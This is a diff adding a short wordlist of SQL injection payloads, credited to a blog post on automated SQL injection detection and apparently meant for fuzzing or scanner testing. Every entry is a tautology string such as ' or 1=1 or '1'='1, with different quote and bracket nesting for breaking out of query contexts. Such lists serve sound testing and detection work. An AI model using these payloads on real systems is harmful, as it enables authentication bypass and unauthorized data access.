@@ -1,0 +1,15 @@
+#
+# from http://www.arneswinnen.net/2013/09/automated-sql-injection-detection/
+#
+999999 or 1=1 or 1=1
+' or 1=1 or '1'='1
+" or 1=1 or "1"="1
+999999) or 1=1 or (1=1
+') or 1=1 or ('1'='1
+") or 1=1 or ("1"="1
+999999)) or 1=1 or ((1=1
+')) or 1=1 or (('1'='1
+")) or 1=1 or (("1"="1
+999999))) or 1=1 or (((1
+'))) or 1=1 or ((('1'='1
+"))) or 1=1 or ((("1"="1
